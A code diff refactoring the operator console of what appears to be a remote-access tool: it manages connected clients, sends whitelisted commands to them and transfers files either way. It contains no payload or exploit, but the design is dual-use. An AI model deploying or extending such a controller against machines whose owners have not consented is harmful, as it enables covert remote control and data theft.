@@ -1,5 +1,8 @@
 from typing import Optional
 from .logger import logger
+from .protocol import build_command
+from .file_transfer import upload_file
+from .file_transfer import download_file
 
 REMOTE_COMMANDS = {
     "help",
@@ -62,11 +65,12 @@ def list_clients(client_manager):
     logger.info("-" * 40)
 
 
+
 def interact_with_client(client_id: str, client_manager):
     client = client_manager.get(client_id)
 
-    if not client:
-        logger.warning("Client not found.")
+    if not client or client.status == "disconnected":
+        logger.warning("Client unavailable")
         return
 
     logger.info(f"Session started with {client.id} ({client.addr[0]})")
@@ -78,7 +82,7 @@ def interact_with_client(client_id: str, client_manager):
             if not cmd:
                 continue
 
-            # ------ LOCAL COMMANDS ------- #
+            # ---------------- LOCAL COMMANDS ---------------- #
             if cmd == "back":
                 logger.info("Leaving session...")
                 break
@@ -88,26 +92,27 @@ def interact_with_client(client_id: str, client_manager):
                 continue
 
             if cmd == "disconnect":
-                client.send("__DISCONNECT__")
+                client.send(build_command("disconnect"))
                 client.close()
                 client_manager.remove(client.id)
                 logger.warning("Client disconnected")
                 break
 
-            # --------- VALIDATE REMOTE COMMAND ---------#
+            # ---------------- VALIDATION ---------------- #
             base_cmd = cmd.split()[0]
 
             if base_cmd not in REMOTE_COMMANDS:
                 logger.warning("Unknown command")
                 continue
 
-            # --------- SEND TO CLIENT --------#
-            client.send(cmd)
+            # ---------------- SEND (PROTOCOL FIX) ---------------- #
+            packet = build_command(base_cmd, cmd.split()[1:])
+            client.send(packet)
 
             response = client.receive()
 
             if response:
-                logger.info(response)
+                logger.info(response.get("result", str(response)))
             else:
                 logger.warning("No response")
 
@@ -119,27 +124,31 @@ def interact_with_client(client_id: str, client_manager):
             break
 
 
-#---------- SESSION COMMANDS ---------#
 def send_command_to_client(command: str, client):
     try:
-        client.send(command)
+        from .protocol import build_command
+
+        packet = build_command(command)
+        client.send(packet)
+
         response = client.receive()
 
         if response:
-            print(response)
+            logger.info(response.get("result", str(response)))
         else:
-            logger.error("[!] No response.")
+            logger.warning("No response.")
 
     except Exception as e:
-        logger.exception(f"[!] Error communicating with client: {e}")
+        logger.exception(f"Communication error: {e}")
 
 
 def print_client_info(client):
+    info = client.info()
+
     logger.info("\nClient info:")
-    logger.info(f"ID      : {client.id}")
-    logger.info(f"IP      : {client.ip}")
-    logger.info(f"Status  : {client.status}")
-    logger.info("")
+    logger.info(f"ID      : {info['id']}")
+    logger.info(f"IP      : {info['ip']}")
+    logger.info(f"Status  : {info['status']}")
 
 
 def handle_upload(command: str, client):
@@ -155,7 +164,7 @@ def handle_upload(command: str, client):
     try:
         from file_transfer import upload_file
         upload_file(client, local_path, remote_path)
-        logger.critical("[+] File uploaded.")
+        logger.info("[+] File uploaded.")
 
     except Exception as e:
         logger.exception(f"[!] Upload failed: {e}")
@@ -174,7 +183,7 @@ def handle_download(command: str, client):
     try:
         from file_transfer import download_file
         download_file(client, remote_path, local_path)
-        logger.critical("[+] File downloaded.")
+        logger.info("[+] File downloaded.")
 
     except Exception as e:
         logger.exception(f"[!] Download failed: {e}")
